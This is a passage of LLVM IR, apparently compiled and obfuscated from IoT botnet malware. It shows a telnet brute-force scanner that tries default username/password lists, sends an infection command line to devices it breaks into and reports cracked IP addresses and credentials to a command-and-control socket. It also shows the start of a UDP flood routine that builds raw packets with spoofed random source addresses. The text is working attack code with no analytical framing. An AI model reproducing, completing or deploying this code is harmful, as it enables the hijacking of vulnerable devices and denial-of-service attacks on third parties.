; <label>:786:                                    ; preds = %761
  %787 = load i32, i32* %2, align 4
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %788
  %790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %789, i32 0, i32 0
  %791 = load i32, i32* %790, align 16
  %792 = call i32 @sclose(i32 %791)
  %793 = load i32, i32* %2, align 4
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %794
  %796 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %795, i32 0, i32 2
  store i8 0, i8* %796, align 8
  %797 = load i32, i32* %2, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %798
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %799, i32 0, i32 3
  store i8 1, i8* %800, align 1
  br label %1128

; <label>:801:                                    ; preds = %761
  %802 = load i32, i32* %2, align 4
  %803 = sext i32 %802 to i64
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %803
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %804, i32 0, i32 0
  %806 = load i32, i32* %805, align 16
  %807 = call i64 @send(i32 %806, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), i64 2, i32 16384)
  %808 = icmp slt i64 %807, 0
  br i1 %808, label %809, label %824

; <label>:809:                                    ; preds = %801
  %810 = load i32, i32* %2, align 4
  %811 = sext i32 %810 to i64
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %811
  %813 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %812, i32 0, i32 0
  %814 = load i32, i32* %813, align 16
  %815 = call i32 @sclose(i32 %814)
  %816 = load i32, i32* %2, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %817
  %819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %818, i32 0, i32 2
  store i8 0, i8* %819, align 8
  %820 = load i32, i32* %2, align 4
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %821
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %822, i32 0, i32 3
  store i8 1, i8* %823, align 1
  br label %1128

; <label>:824:                                    ; preds = %801
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 2
  store i8 6, i8* %828, align 8
  br label %1127

; <label>:829:                                    ; preds = %70
  %830 = load i32, i32* %2, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %831
  %833 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %832, i32 0, i32 6
  %834 = load i32, i32* %833, align 4
  %835 = icmp eq i32 %834, 0
  br i1 %835, label %836, label %842

; <label>:836:                                    ; preds = %829
  %837 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 6
  store i32 %837, i32* %841, align 4
  br label %842

; <label>:842:                                    ; preds = %836, %829
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 0
  %847 = load i32, i32* %846, align 16
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 8
  %852 = load i8*, i8** %851, align 8
  %853 = load i32, i32* %2, align 4
  %854 = sext i32 %853 to i64
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 7
  %857 = load i16, i16* %856, align 16
  %858 = zext i16 %857 to i32
  %859 = call i32 @readUntil(i32 %847, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %852, i32 1024, i32 %858)
  %860 = icmp ne i32 %859, 0
  br i1 %860, label %861, label %936

; <label>:861:                                    ; preds = %842
  %862 = load i32, i32* %2, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 6
  store i32 0, i32* %865, align 4
  %866 = load i32, i32* %2, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 7
  store i16 0, i16* %869, align 16
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 8
  %874 = load i8*, i8** %873, align 8
  %875 = call i8* @strstr(i8* %874, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i32 0, i32 0)) #10
  %876 = icmp ne i8* %875, null
  br i1 %876, label %877, label %897

; <label>:877:                                    ; preds = %861
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 8
  %882 = load i8*, i8** %881, align 8
  call void @llvm.memset.p0i8.i64(i8* %882, i8 0, i64 1024, i32 1, i1 false)
  %883 = load i32, i32* %2, align 4
  %884 = sext i32 %883 to i64
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %884
  %886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %885, i32 0, i32 0
  %887 = load i32, i32* %886, align 16
  %888 = call i32 @sclose(i32 %887)
  %889 = load i32, i32* %2, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %890
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %891, i32 0, i32 2
  store i8 0, i8* %892, align 8
  %893 = load i32, i32* %2, align 4
  %894 = sext i32 %893 to i64
  %895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %894
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %895, i32 0, i32 3
  store i8 0, i8* %896, align 1
  br label %1128

; <label>:897:                                    ; preds = %861
  %898 = load i32, i32* %2, align 4
  %899 = sext i32 %898 to i64
  %900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %899
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %900, i32 0, i32 8
  %902 = load i8*, i8** %901, align 8
  %903 = call i32 @matchPrompt(i8* %902)
  %904 = icmp ne i32 %903, 0
  br i1 %904, label %925, label %905

; <label>:905:                                    ; preds = %897
  %906 = load i32, i32* %2, align 4
  %907 = sext i32 %906 to i64
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %907
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %908, i32 0, i32 8
  %910 = load i8*, i8** %909, align 8
  call void @llvm.memset.p0i8.i64(i8* %910, i8 0, i64 1024, i32 1, i1 false)
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 0
  %915 = load i32, i32* %914, align 16
  %916 = call i32 @sclose(i32 %915)
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 2
  store i8 0, i8* %920, align 8
  %921 = load i32, i32* %2, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 3
  store i8 1, i8* %924, align 1
  br label %1128

; <label>:925:                                    ; preds = %897
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 2
  store i8 7, i8* %929, align 8
  br label %930

; <label>:930:                                    ; preds = %925
  %931 = load i32, i32* %2, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 8
  %935 = load i8*, i8** %934, align 8
  call void @llvm.memset.p0i8.i64(i8* %935, i8 0, i64 1024, i32 1, i1 false)
  br label %1128

; <label>:936:                                    ; preds = %842
  %937 = load i32, i32* %2, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 8
  %941 = load i8*, i8** %940, align 8
  %942 = call i64 @strlen(i8* %941) #10
  %943 = trunc i64 %942 to i16
  %944 = load i32, i32* %2, align 4
  %945 = sext i32 %944 to i64
  %946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %945
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %946, i32 0, i32 7
  store i16 %943, i16* %947, align 16
  br label %948

; <label>:948:                                    ; preds = %936
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 6
  %953 = load i32, i32* %952, align 4
  %954 = sub i32 0, 30
  %955 = sub i32 %953, %954
  %956 = add i32 %953, 30
  %957 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %958 = icmp ult i32 %955, %957
  br i1 %958, label %959, label %974

; <label>:959:                                    ; preds = %948
  %960 = load i32, i32* %2, align 4
  %961 = sext i32 %960 to i64
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %961
  %963 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %962, i32 0, i32 0
  %964 = load i32, i32* %963, align 16
  %965 = call i32 @sclose(i32 %964)
  %966 = load i32, i32* %2, align 4
  %967 = sext i32 %966 to i64
  %968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %967
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %968, i32 0, i32 2
  store i8 0, i8* %969, align 8
  %970 = load i32, i32* %2, align 4
  %971 = sext i32 %970 to i64
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %971
  %973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %972, i32 0, i32 3
  store i8 1, i8* %973, align 1
  br label %974

; <label>:974:                                    ; preds = %959, %948
  br label %1127

; <label>:975:                                    ; preds = %70
  %976 = load i32, i32* %2, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 0
  %980 = load i32, i32* %979, align 16
  %981 = call i64 @send(i32 %980, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.79, i32 0, i32 0), i64 4, i32 16384)
  %982 = icmp slt i64 %981, 0
  br i1 %982, label %983, label %998

; <label>:983:                                    ; preds = %975
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 0
  %988 = load i32, i32* %987, align 16
  %989 = call i32 @sclose(i32 %988)
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 2
  store i8 0, i8* %993, align 8
  %994 = load i32, i32* %2, align 4
  %995 = sext i32 %994 to i64
  %996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %995
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %996, i32 0, i32 3
  store i8 1, i8* %997, align 1
  br label %1128

; <label>:998:                                    ; preds = %975
  %999 = load i32, i32* %2, align 4
  %1000 = sext i32 %999 to i64
  %1001 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1000
  %1002 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1001, i32 0, i32 2
  store i8 8, i8* %1002, align 8
  br label %1127

; <label>:1003:                                   ; preds = %70
  %1004 = load i32, i32* %2, align 4
  %1005 = sext i32 %1004 to i64
  %1006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1005
  %1007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1006, i32 0, i32 6
  %1008 = load i32, i32* %1007, align 4
  %1009 = icmp eq i32 %1008, 0
  br i1 %1009, label %1010, label %1016

; <label>:1010:                                   ; preds = %1003
  %1011 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1012 = load i32, i32* %2, align 4
  %1013 = sext i32 %1012 to i64
  %1014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1013
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1014, i32 0, i32 6
  store i32 %1011, i32* %1015, align 4
  br label %1016

; <label>:1016:                                   ; preds = %1010, %1003
  %1017 = load i32, i32* %2, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1018
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 16
  %1022 = load i8*, i8** @infectline, align 8
  %1023 = load i8*, i8** @infectline, align 8
  %1024 = call i64 @strlen(i8* %1023) #10
  %1025 = call i64 @send(i32 %1021, i8* %1022, i64 %1024, i32 16384)
  %1026 = icmp slt i64 %1025, 0
  br i1 %1026, label %1027, label %1047

; <label>:1027:                                   ; preds = %1016
  %1028 = load i32, i32* %2, align 4
  %1029 = sext i32 %1028 to i64
  %1030 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1029
  %1031 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1030, i32 0, i32 0
  %1032 = load i32, i32* %1031, align 16
  %1033 = call i32 @sclose(i32 %1032)
  %1034 = load i32, i32* %2, align 4
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1035
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1036, i32 0, i32 2
  store i8 0, i8* %1037, align 8
  %1038 = load i32, i32* %2, align 4
  %1039 = sext i32 %1038 to i64
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1039
  %1041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1040, i32 0, i32 3
  store i8 1, i8* %1041, align 1
  %1042 = load i32, i32* %2, align 4
  %1043 = sext i32 %1042 to i64
  %1044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1043
  %1045 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1044, i32 0, i32 8
  %1046 = load i8*, i8** %1045, align 8
  call void @llvm.memset.p0i8.i64(i8* %1046, i8 0, i64 1024, i32 1, i1 false)
  br label %1128

; <label>:1047:                                   ; preds = %1016
  %1048 = load i32, i32* @mainCommSock, align 4
  %1049 = load i32, i32* %2, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1050
  %1052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1051, i32 0, i32 1
  %1053 = bitcast i32* %1052 to %struct.in_addr*
  %1054 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1053, i32 0, i32 0
  %1055 = load i32, i32* %1054, align 4
  %1056 = call i8* @inet_ntoa(i32 %1055) #2
  %1057 = load i32, i32* %2, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1058
  %1060 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1059, i32 0, i32 4
  %1061 = load i8, i8* %1060, align 2
  %1062 = zext i8 %1061 to i64
  %1063 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1062
  %1064 = load i8*, i8** %1063, align 8
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 5
  %1069 = load i8, i8* %1068, align 1
  %1070 = zext i8 %1069 to i64
  %1071 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1070
  %1072 = load i8*, i8** %1071, align 8
  %1073 = call i32 (i32, i8*, ...) @sockprintf(i32 %1048, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.80, i32 0, i32 0), i8* %1056, i8* %1064, i8* %1072)
  %1074 = load i32, i32* %2, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1075
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1076, i32 0, i32 6
  %1078 = load i32, i32* %1077, align 4
  %1079 = add i32 %1078, -212297973
  %1080 = add i32 %1079, 8
  %1081 = sub i32 %1080, -212297973
  %1082 = add i32 %1078, 8
  %1083 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1084 = icmp ult i32 %1081, %1083
  br i1 %1084, label %1085, label %1126

; <label>:1085:                                   ; preds = %1047
  %1086 = load i32, i32* @mainCommSock, align 4
  %1087 = load i32, i32* %2, align 4
  %1088 = sext i32 %1087 to i64
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1088
  %1090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1089, i32 0, i32 1
  %1091 = bitcast i32* %1090 to %struct.in_addr*
  %1092 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1091, i32 0, i32 0
  %1093 = load i32, i32* %1092, align 4
  %1094 = call i8* @inet_ntoa(i32 %1093) #2
  %1095 = load i32, i32* %2, align 4
  %1096 = sext i32 %1095 to i64
  %1097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1096
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1097, i32 0, i32 4
  %1099 = load i8, i8* %1098, align 2
  %1100 = zext i8 %1099 to i64
  %1101 = getelementptr inbounds [19 x i8*], [19 x i8*]* @usernames, i64 0, i64 %1100
  %1102 = load i8*, i8** %1101, align 8
  %1103 = load i32, i32* %2, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 5
  %1107 = load i8, i8* %1106, align 1
  %1108 = zext i8 %1107 to i64
  %1109 = getelementptr inbounds [26 x i8*], [26 x i8*]* @passwords, i64 0, i64 %1108
  %1110 = load i8*, i8** %1109, align 8
  %1111 = call i32 (i32, i8*, ...) @sockprintf(i32 %1086, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.81, i32 0, i32 0), i8* %1094, i8* %1102, i8* %1110)
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1114, i32 0, i32 0
  %1116 = load i32, i32* %1115, align 16
  %1117 = call i32 @sclose(i32 %1116)
  %1118 = load i32, i32* %2, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 2
  store i8 0, i8* %1121, align 8
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 3
  store i8 1, i8* %1125, align 1
  br label %1126

; <label>:1126:                                   ; preds = %1085, %1047
  br label %1127

; <label>:1127:                                   ; preds = %1126, %998, %974, %824, %760, %603, %539, %436, %255, %70
  br label %1128

; <label>:1128:                                   ; preds = %1127, %1027, %983, %930, %905, %877, %809, %786, %706, %692, %588, %565, %482, %355, %193, %149
  %1129 = load i32, i32* %2, align 4
  %1130 = sub i32 %1129, 284012031
  %1131 = add i32 %1130, 1
  %1132 = add i32 %1131, 284012031
  %1133 = add nsw i32 %1129, 1
  store i32 %1132, i32* %2, align 4
  br label %66

; <label>:1134:                                   ; preds = %66
  br label %64
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

declare i32 @time(...) #3

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #13
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %242

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %242

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #2
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %242

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %65, %56
  %58 = load i32, i32* %17, align 4
  %59 = sub i32 0, %58
  %60 = sub i32 0, -1
  %61 = add i32 %59, %60
  %62 = sub i32 0, %61
  %63 = add nsw i32 %58, -1
  store i32 %62, i32* %17, align 4
  %64 = icmp ne i32 %58, 0
  br i1 %64, label %65, label %80

; <label>:65:                                     ; preds = %57
  %66 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %67 = call i32 @rand_cmwc()
  %68 = xor i32 %66, -1
  %69 = and i32 1937501566, %68
  %70 = xor i32 1937501566, -1
  %71 = and i32 %66, %70
  %72 = xor i32 %67, -1
  %73 = and i32 %72, 1937501566
  %74 = and i32 %67, %70
  %75 = or i32 %69, %71
  %76 = or i32 %73, %74
  %77 = xor i32 %75, %76
  %78 = xor i32 %66, %67
  call void @srand(i32 %77) #2
  %79 = call i32 @rand() #2
  call void @init_rand(i32 %79)
  br label %57

; <label>:80:                                     ; preds = %57
  %81 = load i32, i32* %12, align 4
  %82 = add i32 32, -858885161
  %83 = sub i32 %82, %81
  %84 = sub i32 %83, -858885161
  %85 = sub nsw i32 32, %81
  %86 = shl i32 1, %84
  %87 = sub i32 0, 1
  %88 = add i32 %86, %87
  %89 = sub nsw i32 %86, 1
  %90 = xor i32 %88, -1
  %91 = and i32 -634344475, %90
  %92 = xor i32 -634344475, -1
  %93 = and i32 %88, %92
  %94 = xor i32 -1, -1
  %95 = and i32 %94, -634344475
  %96 = and i32 -1, %92
  %97 = or i32 %91, %93
  %98 = or i32 %95, %96
  %99 = xor i32 %97, %98
  %100 = xor i32 %88, -1
  store i32 %99, i32* %18, align 4
  %101 = load i32, i32* %10, align 4
  %102 = sext i32 %101 to i64
  %103 = sub i64 28, 1762633979463639195
  %104 = add i64 %103, %102
  %105 = add i64 %104, 1762633979463639195
  %106 = add i64 28, %102
  %107 = call i8* @llvm.stacksave()
  store i8* %107, i8** %19, align 8
  %108 = alloca i8, i64 %105, align 16
  %109 = bitcast i8* %108 to %struct.iphdr*
  store %struct.iphdr* %109, %struct.iphdr** %20, align 8
  %110 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %111 = bitcast %struct.iphdr* %110 to i8*
  %112 = getelementptr i8, i8* %111, i64 20
  %113 = bitcast i8* %112 to %struct.udphdr*
  store %struct.udphdr* %113, %struct.udphdr** %21, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %116 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 4
  %118 = load i32, i32* %18, align 4
  %119 = call i32 @getRandomIP(i32 %118)
  %120 = call i32 @htonl(i32 %119) #13
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = sub i64 8, 5837601891956044082
  %124 = add i64 %123, %122
  %125 = add i64 %124, 5837601891956044082
  %126 = add i64 8, %122
  %127 = trunc i64 %125 to i32
  call void @makeIPPacket(%struct.iphdr* %114, i32 %117, i32 %120, i8 zeroext 17, i32 %127)
  %128 = load i32, i32* %10, align 4
  %129 = sext i32 %128 to i64
  %130 = sub i64 0, %129
  %131 = sub i64 8, %130
  %132 = add i64 8, %129
  %133 = trunc i64 %131 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #13
  %135 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %136 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %135, i32 0, i32 0
  %137 = bitcast %union.anon.2* %136 to %struct.anon.3*
